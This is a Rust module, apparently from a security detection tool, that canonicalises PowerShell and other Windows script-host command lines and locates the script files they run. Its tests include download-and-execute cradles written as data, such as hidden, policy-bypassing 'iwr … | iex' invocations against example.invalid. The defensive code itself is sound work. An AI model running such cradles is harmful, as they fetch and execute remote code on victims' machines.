//! Command lines of the programs that run scripts (PowerShell, cmd, mshta, Windows Script
//! Host): spelling PowerShell's switches and aliases the one way the rules look for, and
//! finding the script file a host is told to run. Nothing is executed.

use std::path::{Path, PathBuf};

/// Programs that run code given on their command line, or in a script file named there.
/// `conhost.exe --headless` starts a console program with no window at all.
pub const SCRIPT_HOSTS: &[&str] = &["powershell.exe", "pwsh.exe", "cmd.exe", "mshta.exe", "wscript.exe", "cscript.exe", "conhost.exe"];

/// PowerShell's switches, in the order it resolves an abbreviation (`-e` is
/// -EncodedCommand, not -ExecutionPolicy), and whether each takes a value.
const SWITCHES: &[(&str, bool)] = &[
    ("Command", false),
    ("ConfigurationName", true),
    ("EncodedCommand", true),
    ("ExecutionPolicy", true),
    ("File", false),
    ("InputFormat", true),
    ("Mta", false),
    ("NoExit", false),
    ("NoLogo", false),
    ("NonInteractive", false),
    ("NoProfile", false),
    ("OutputFormat", true),
    ("PSConsoleFile", true),
    ("Sta", false),
    ("Version", true),
    ("WindowStyle", true),
    ("WorkingDirectory", true),
];

/// Built-in aliases of the commands download cradles use.
const ALIASES: &[(&str, &str)] = &[
    ("iex", "Invoke-Expression"),
    ("irm", "Invoke-RestMethod"),
    ("iwr", "Invoke-WebRequest"),
    ("ii", "Invoke-Item"),
    ("saps", "Start-Process"),
    ("start", "Start-Process"),
];

/// How much of an unquoted -Command after a PowerShell invocation in a file counts as its code.
const MAX_COMMAND: usize = 1024;

pub fn is_script_host(image: &Path) -> bool {
    image.file_name().is_some_and(|n| SCRIPT_HOSTS.iter().any(|h| n.eq_ignore_ascii_case(h)))
}

/// Name a host's command line is analyzed under, so script recovery treats it as that language.
pub fn script_name(host: &str) -> &'static str {
    match host {
        "powershell.exe" | "pwsh.exe" => "command.ps1",
        "cmd.exe" => "command.cmd",
        _ => "command.txt",
    }
}

/// The command line without the program name (argv[0], which the caller chooses freely).
pub fn arguments(line: &str) -> &str {
    let line = line.trim_start();
    let end = match line.strip_prefix('"') {
        Some(rest) => rest.find('"').map_or(line.len(), |i| i + 2),
        None => line.find(char::is_whitespace).unwrap_or(line.len()),
    };
    line[end..].trim_start()
}

/// PowerShell switch an argument names, however it is abbreviated or dashed
/// (`-w`, `/WindowStyle`, `–win`), and whether it takes a value.
pub fn powershell_switch(arg: &str) -> Option<(&'static str, bool)> {
    let name = arg.trim_start_matches(['-', '/', '\u{2013}', '\u{2014}', '\u{2015}']);
    if name.len() == arg.len() || name.is_empty() {
        return None;
    }
    let name = name.to_ascii_lowercase();
    let alias = match name.as_str() {
        "ep" => Some("ExecutionPolicy"),
        "ec" => Some("EncodedCommand"),
        "wd" => Some("WorkingDirectory"),
        _ => None,
    };
    SWITCHES.iter().find(|(s, _)| alias == Some(*s) || s.to_ascii_lowercase().starts_with(&name)).copied()
}

fn canonical_value(switch: &str, value: &str) -> String {
    let lower = value.to_ascii_lowercase();
    match (switch, lower.as_str()) {
        // ProcessWindowStyle.Hidden is 1, and PowerShell accepts the number too.
        ("WindowStyle", "hidden" | "1") => "Hidden".into(),
        ("ExecutionPolicy", "bypass") => "Bypass".into(),
        ("ExecutionPolicy", "unrestricted") => "Unrestricted".into(),
        _ => value.into(),
    }
}

/// Text with every PowerShell invocation's switches written out in full (`-w hidden -ep
/// bypass` becomes `-WindowStyle Hidden -ExecutionPolicy Bypass`) and the aliases in its
/// -Command spelled out. `None` when nothing changed.
pub fn canonical_powershell(text: &str) -> Option<String> {
    let lower = text.to_ascii_lowercase();
    let bytes = text.as_bytes();
    let mut out = String::with_capacity(text.len() + 64);
    let mut copied = 0;
    let mut search = 0;
    while let Some(found) = ["powershell", "pwsh"].iter().filter_map(|h| lower[search..].find(h).map(|i| search + i)).min() {
        // The rest of the program's name: `.exe`, a closing quote.
        let mut i = found;
        while i < bytes.len() && !bytes[i].is_ascii_whitespace() {
            i += 1;
        }
        out.push_str(&text[copied..i]);
        copied = i;
        let mut switched = false;
        loop {
            let start = skip_space(bytes, copied);
            let Some((token, end)) = next_token(text, start) else { break };
            let Some((name, takes_value)) = powershell_switch(token) else {
                // A bare command: the rest is PowerShell code. Prose that merely mentions
                // PowerShell ("run powershell and start…") has neither switches nor a cradle word.
                if switched || expand_aliases(token).is_some() {
                    copied = expand_command(text, start, &mut out, copied);
                }
                break;
            };
            switched = true;
            out.push_str(&text[copied..start]);
            out.push('-');
            out.push_str(name);
            copied = end;
            if takes_value && let Some((value, end)) = next_token(text, skip_space(bytes, copied)) {
                out.push(' ');
                out.push_str(&canonical_value(name, value));
                copied = end;
            }
            if name == "Command" {
                copied = expand_command(text, skip_space(bytes, copied), &mut out, copied);
                break;
            }
            if name == "File" {
                break;
            }
        }
        search = copied.max(found + 1);
    }
    out.push_str(&text[copied..]);
    (out != text).then_some(out)
}

/// Writes the code of a -Command starting at `start` with its aliases spelled out:
/// up to the closing quote, or for unquoted code the end of the line.
fn expand_command(text: &str, start: usize, out: &mut String, copied: usize) -> usize {
    let bytes = text.as_bytes();
    let end = match bytes.get(start) {
        Some(&q @ (b'"' | b'\'')) => text[start + 1..].find(q as char).map_or(text.len(), |i| start + 1 + i),
        _ => text[start..].find(['\n', '\r']).map_or(text.len(), |i| start + i),
    };
    let end = floor_boundary(text, end.min(start + MAX_COMMAND));
    out.push_str(&text[copied..start]);
    out.push_str(&expand_aliases(&text[start..end]).unwrap_or_else(|| text[start..end].to_string()));
    end
}

/// PowerShell code with the cradle commands' aliases (`iwr`, `irm`, `iex`…) spelled out.
/// `None` when there are none.
pub fn expand_aliases(code: &str) -> Option<String> {
    let bytes = code.as_bytes();
    let word = |b: u8| b.is_ascii_alphanumeric() || b == b'_' || b == b'-';
    let mut out = String::with_capacity(code.len() + 32);
    let mut copied = 0;
    let mut i = 0;
    while i < bytes.len() {
        if !word(bytes[i]) {
            i += 1;
            continue;
        }
        let start = i;
        while i < bytes.len() && word(bytes[i]) {
            i += 1;
        }
        // `$iex`, `.Start()` and `env:start` are a variable, a method and a path.
        if start > 0 && matches!(bytes[start - 1], b'$' | b'.' | b':') {
            continue;
        }
        if let Some((_, full)) = ALIASES.iter().find(|(a, _)| code[start..i].eq_ignore_ascii_case(a)) {
            out.push_str(&code[copied..start]);
            out.push_str(full);
            copied = i;
        }
    }
    if copied == 0 {
        return None;
    }
    out.push_str(&code[copied..]);
    Some(out)
}

/// Script file a host is told to run, by full path: `powershell -File x.ps1`,
/// `wscript x.vbs`, `mshta x.hta`, `cmd /c x.bat`. Relative paths depend on the host's
/// working directory and are left out.
pub fn script_file(image: &Path, args: &[String]) -> Option<PathBuf> {
    let host = image.file_name()?.to_string_lossy().to_ascii_lowercase();
    let rest = args.get(1..).unwrap_or_default();
    let named = match host.as_str() {
        "powershell.exe" | "pwsh.exe" => {
            let mut i = 0;
            loop {
                let arg = rest.get(i)?;
                match powershell_switch(arg) {
                    Some(("File", _)) => break rest.get(i + 1)?,
                    Some(("Command", _)) => return None,
                    Some((_, true)) => i += 2,
                    Some((_, false)) => i += 1,
                    // `powershell C:\x\a.ps1` runs the script as a command.
                    None if arg.to_ascii_lowercase().ends_with(".ps1") => break arg,
                    None => return None,
                }
            }
        }
        "wscript.exe" | "cscript.exe" => rest.iter().find(|a| !a.starts_with("//"))?,
        "mshta.exe" => rest.first()?,
        "cmd.exe" => {
            let i = rest.iter().position(|a| a.eq_ignore_ascii_case("/c") || a.eq_ignore_ascii_case("/k"))?;
            // ShellExecute on a .bat passes `/c ""C:\x\s.bat" "`, which splits into `C:\x\s.bat `.
            let arg = rest.get(i + 1)?.trim_end();
            let lower = arg.to_ascii_lowercase();
            if !lower.ends_with(".bat") && !lower.ends_with(".cmd") {
                return None;
            }
            arg
        }
        _ => return None,
    };
    let path = Path::new(named.trim().trim_matches(['"', '\'']));
    path.is_absolute().then(|| path.to_path_buf())
}

fn skip_space(bytes: &[u8], mut i: usize) -> usize {
    while i < bytes.len() && bytes[i].is_ascii_whitespace() {
        i += 1;
    }
    i
}

/// The word at `start`, without quotes, and where it ends. Unquoted words also end at
/// shell punctuation, so `-w hidden"` and `-nop;` still read as switches.
fn next_token(text: &str, start: usize) -> Option<(&str, usize)> {
    let bytes = text.as_bytes();
    let first = *bytes.get(start)?;
    if matches!(first, b'"' | b'\'') {
        let close = text[start + 1..].find(first as char).map(|i| start + 1 + i);
        let end = close.unwrap_or(text.len());
        return Some((&text[start + 1..end], close.map_or(end, |c| c + 1)));
    }
    let end = text[start..].find(|c: char| c.is_ascii_whitespace() || "\"';|&)".contains(c)).map_or(text.len(), |i| start + i);
    Some((&text[start..end], end))
}

fn floor_boundary(text: &str, mut i: usize) -> usize {
    while !text.is_char_boundary(i) {
        i -= 1;
    }
    i
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn switches_resolve_however_they_are_abbreviated() {
        for (arg, name) in [
            ("-w", "WindowStyle"),
            ("-win", "WindowStyle"),
            ("/WindowStyle", "WindowStyle"),
            ("\u{2013}windowstyle", "WindowStyle"),
            ("--windowstyle", "WindowStyle"),
            ("-e", "EncodedCommand"),
            ("-enc", "EncodedCommand"),
            ("-ec", "EncodedCommand"),
            ("-ex", "ExecutionPolicy"),
            ("-ep", "ExecutionPolicy"),
            ("-nop", "NoProfile"),
            ("-noni", "NonInteractive"),
            ("-c", "Command"),
            ("-f", "File"),
        ] {
            assert_eq!(powershell_switch(arg).map(|s| s.0), Some(name), "{arg}");
        }
        assert_eq!(powershell_switch("hidden"), None);
        assert_eq!(powershell_switch("-"), None);
        assert_eq!(powershell_switch("-zzz"), None);
    }

    #[test]
    fn invocations_are_written_out_in_full() {
        let c = canonical_powershell("powershell.exe -w hidden -ep bypass -nop -c \"iwr http://example.invalid | iex\"").unwrap();
        assert_eq!(c, "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -Command \"Invoke-WebRequest http://example.invalid | Invoke-Expression\"");
        let c = canonical_powershell("cmd /c \"PowerShell /win 1 \u{2014}exec Bypass\"").unwrap();
        assert!(c.contains("-WindowStyle Hidden -ExecutionPolicy Bypass"), "{c}");
        // An implicit -Command: the first word that is not a switch.
        let c = canonical_powershell("pwsh -noni irm https://example.invalid | iex").unwrap();
        assert!(c.ends_with("-NonInteractive Invoke-RestMethod https://example.invalid | Invoke-Expression"), "{c}");
        // Script arguments after -File are left alone.
        let c = canonical_powershell("powershell -f C:\\a.ps1 -w x").unwrap();
        assert!(c.ends_with("-File C:\\a.ps1 -w x"), "{c}");
        assert_eq!(canonical_powershell("Run PowerShell as an administrator."), None);
        assert_eq!(canonical_powershell("powershell -WindowStyle Hidden -File x.ps1"), None);
    }

    #[test]
    fn aliases_are_only_whole_commands() {
        assert_eq!(expand_aliases("iex(irm 'https://example.invalid')").unwrap(), "Invoke-Expression(Invoke-RestMethod 'https://example.invalid')");
        assert_eq!(expand_aliases("start $f; saps $g").unwrap(), "Start-Process $f; Start-Process $g");
        for code in ["$iex = 1; $p.Start(); Start-Job {}; Get-Item env:start; ascii; irmgard", "Write-Output 'hello'"] {
            assert_eq!(expand_aliases(code), None, "{code}");
        }
    }

    #[test]
    fn program_name_is_dropped_from_command_lines() {
        assert_eq!(arguments("\"C:\\Windows\\System32\\mshta.exe\" http://example.invalid/a"), "http://example.invalid/a");
        assert_eq!(arguments("powershell  -nop"), "-nop");
        assert_eq!(arguments("cmd.exe"), "");
        assert_eq!(arguments("\"unterminated"), "");
    }

    #[test]
    fn finds_the_script_a_host_is_told_to_run() {
        let file = |image: &str, args: &[&str]| script_file(Path::new(image), &args.iter().map(|a| a.to_string()).collect::<Vec<_>>());
        let ps = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe";
        assert_eq!(file(ps, &["powershell", "-w", "hidden", "-ep", "bypass", "-File", r"C:\Users\me\a.ps1", "x"]), Some(PathBuf::from(r"C:\Users\me\a.ps1")));
        assert_eq!(file(ps, &["powershell", "-nop", r"C:\Users\me\b.ps1"]), Some(PathBuf::from(r"C:\Users\me\b.ps1")));
        assert_eq!(file(ps, &["powershell", "-c", r"C:\Users\me\b.ps1"]), None);
        assert_eq!(file(ps, &["powershell", "-File", r".\rel.ps1"]), None);
        assert_eq!(file(r"C:\Windows\System32\wscript.exe", &["wscript", "//B", "//Nologo", r"C:\Users\me\x.vbs"]), Some(PathBuf::from(r"C:\Users\me\x.vbs")));
        assert_eq!(file(r"C:\Windows\System32\mshta.exe", &["mshta", "http://example.invalid/a.hta"]), None);
        assert_eq!(file(r"C:\Windows\System32\mshta.exe", &["mshta", r"C:\Users\me\a.hta"]), Some(PathBuf::from(r"C:\Users\me\a.hta")));
        assert_eq!(file(r"C:\Windows\System32\cmd.exe", &["cmd", "/q", "/c", r"C:\Users\me\run.bat", "arg"]), Some(PathBuf::from(r"C:\Users\me\run.bat")));
        // How cmd is started when a program opens a .bat (ShellExecute).
        assert_eq!(file(r"C:\Windows\System32\cmd.exe", &["cmd", "/c", r"C:\Users\me\Documents\s.bat "]), Some(PathBuf::from(r"C:\Users\me\Documents\s.bat")));
        assert_eq!(file(r"C:\Windows\System32\cmd.exe", &["cmd", "/c", "echo", "hi"]), None);
        assert_eq!(file(r"C:\Windows\notepad.exe", &["notepad", r"C:\a.ps1"]), None);
    }
}
